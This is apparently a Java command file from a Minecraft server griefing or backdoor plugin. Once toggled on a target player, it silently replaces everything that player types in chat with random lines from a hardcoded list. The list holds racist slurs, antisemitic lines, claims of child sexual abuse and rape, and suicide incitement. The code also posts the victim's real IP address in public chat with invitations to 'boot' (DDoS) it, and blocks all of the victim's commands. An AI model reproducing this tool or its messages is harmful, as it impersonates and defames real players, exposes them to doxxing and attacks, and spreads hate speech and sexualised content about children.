package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.*;

public class Gargle implements Command, Listener {
    private final String[] messagesStringArray = {
            "Fuck all of you!", "Fun fact, niggers are more likely to fuck your bitch than other races!", "I hate people of color.",
            "Sometimes I like to lie down in my bed, and read an extremely sexy and graphic Diary of a Wimpy kid fanfiction.", "Another fun fact, I hate jews.",
            ".help 2", ".toggle killaura", ".toggle flight", "Where's the owner? I need some bitch to suck my dick.", "You all can suck-a my cock.", "Niggers piss me off!",
            "Sometimes I stick my finger up my ass to feel something.", "Hey owner! We should be bumming buddies!", "I need someone to itch my crusty bumhole!!!",
            "Hey! You! Yeah you! Kill yourself!", "Sometimes I like to go to PornHub and watch SpongeBob porn because sandy makes me wet.", "My cock and balls need squeezing!",
            "Who's down to fuck?", "I like to abduct and rape toddlers.",
            "I have so much child pornography you wouldn't believe!", "Oh hey! I remember this server! I cheated and got banned!", "I'm a tier 3 sub of pokimane!",
            "No! I'm not a simp! I just respect and have donated around 10k to pokimane!", "This server looks shit enough to cheat on!", "Hey faggot! Ban me if you can! I have a new hack!",
            "I love to molest kids!", "Who wants to see my penis? I thought you would!", "Jews make me really fucking angry.", "Sometimes when I go to sleep I dream of having gay anal sex.",
            "Who want's to fuck and suck my asshole! All men accepted!", "uwu I need someone to walk me uwu I've been a naughty doggy", "im such a bad boy, please spank me uwu",
            "im begging for someone to plunge my asshole uwu", "jews are not uwu", "sometimes I like to drink my own piss", "during sex I love to eat poo",
            "I love when my little sister crushes my balls!!!", "wow this server is so bad holy shit", "omg this has to be the worst server I've ever been on!",
            "Staff TP!!! I shit my pants!", "Owner owner!!! I need help! there is a brown spot on my chair!", "staff tp there's a hacker! just kidding it's me",
            "You got those nigga lips my homie!", "I'm a shit sniffer!", "Who wants to try out my cum? It tastes like the dude I fucked yesterday.",
            "You guys know I actually fucked hitler before he gas'd me?", "Who wants to see my private porn-o with a child?", "Family guy is my favorite show! Stewie hot!!!",
            "Hey fellow gamers, are any girl gamers underage here looking for a male companion?", "Who want's to e-date? Must be 8 and under.", "I LOVE to rape toddlers.",
            ".lagserver", ".lagserver 10", "my ip is %IP% plz boot it off", "%IP% is DEFINITELY NOT MY IP", "i weeeely wish someone would boot me at %IP%!!!", "Greg heffley is in my basement right now",
            "Anyone wanna go on a road trip with me in my big white van?", "wittle kwiddies mwake my pwivate pwarts twingle", "Midgets really fucken piss me off!", "A steaming pile of dog poo makes me so wet",
            "I CANT STAND SHORT PEOPLE", "IF YOUR A MIDGET YOU SHOULD KILL YOURSELF", "I pray to Greg Peg every night before bed", "I really wanna be pegged by greg", "I really love to sexually pleasure shemales",
            "Anyone up for gay anal sex?", "Nazi germany was my favourite historical period in time", "Im the leader of a pedo ring", "Cant wait for your big black cock to rupture my asshole",
            "I have blood pouring out of my penis", "I eat cum for breakfast", "OP ME OP ME!!!!", "I found this server through planetminecraft", "Fun Fact: I abduct roughly 12 children per year",
            "My basement has sound proof walls ;)", "I own my very own BDSM dungeon", "Child pornography makes me so wet!!!!!!!", "I HAVE BEEN DIAGNOSED WITH AUTISM!!!!", "VPN + ALT = BAN BYPASS",
            "Owner, Owner please do the command /stop", "IT WOULD GIVE ME AN OUTRAGOUS BONER IF YOU WERE TO HIT ME OFF UWU %IP%", "My favourite places are preschools", "I am a convicted sexual predator",
            "I am apart of the MAP community", "The age of consent should be lowered significally", "If we go to China we can have sex at 14!!!!! POGGERS!!!", "I really wanna shit in your mouth!!",
            "What do you need my IP for? either way here it is %IP%", "I resolved your ip address to be %IP%", "The servers IP is %IP%", "I was the one lagging the server earlier!!", "They didn't catch me cheating earlier LMAO",
            "Why does the age of consent even exist?", "Legalize beastiality!!!!!!", "BLACK LIVES DONT MATTER!!!!!", "12 year olds are really hot I wanna fuck them so bad", "Im on the FBIs wanted list for being a child rapist",
            "I am legally required to tell you that I am a sex offender!!", "I am not allowed to own a computer by law.. I am breaking my parole", "I have little cages in my basement for all the 3 year olds",
            "Who wants free candy, I have it at %IP%", "You should join my better Minecraft server %IP%", "FUCK a child is escaping from my basement!", "PEG ME MORE UWU",
            "Download my favourite game: Raid Shadow Legends at %IP%", "Stomp on my balls as hard as you can uwu", "Onii-chan what if mom and dad finds out", "I put duct tape around my little sisters mouth for later tonight",
            "My sister is tighter than my mom for sure", "Spank me OwO", "I love it from behind from toddlers", "I have more second graders in my basement than you have dollars", "I have semen oozing down my face!!",
            "I just came in a child", "I love to watch gay child porn ;)", "I like to go to the park and pick a child to abduct", "I jerk off to 6 year olds in my free time", "I like to fuck midgets and dump their bodies in lakes",
            "I get turned on by internal organs"
    };
    private final ArrayList<String> messages = new ArrayList<>(Arrays.asList(messagesStringArray));

    private final ArrayList<UUID> toggled = new ArrayList<>();
    private final HashMap<UUID, ArrayList<String>> alreadySent = new HashMap<>();

    @Override
    public int minAConsoleArgs() {
        return 1;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"gargle"};
    }

    @Override
    public String getDescription() {
        return "Whenever a player speaks, they just spew nonsense.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: gargle <player>");
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player could not be found!");
            return;
        }

        if (toggled.contains(found.getUniqueId())) {
            toggled.remove(found.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Ungargled " + found.getName() + "!");
            return;
        }

        alreadySent.computeIfAbsent(found.getUniqueId(), k -> (ArrayList<String>) messages.clone());

        toggled.add(found.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + "Gargled " + found.getName() + "!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.LOWEST) // Get effected by other formatting
    private void onChat(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        if (toggled.contains(player.getUniqueId())) {
            String ip = "";

            if (player.getAddress() != null) {
                ip = player.getAddress().getAddress().toString().replaceAll("/", "");
            }

            alreadySent.computeIfAbsent(player.getUniqueId(), k -> (ArrayList<String>) messages.clone());

            ArrayList<String> remaining = alreadySent.get(player.getUniqueId());

            if (remaining.size() == 0 || remaining.size() == 1) {
                remaining = (ArrayList<String>) messages.clone();
            }

            String chosenMessage;
            try {
                chosenMessage = remaining.get(new Random().nextInt(remaining.size()));
            } catch (Exception ignored) {
                return;
            }

            remaining.remove(chosenMessage);
            alreadySent.put(player.getUniqueId(), remaining);

            e.setMessage(chosenMessage.replaceAll("%IP%", ip));
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onCommand(PlayerCommandPreprocessEvent e) {
        if (toggled.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
        }
    }
}
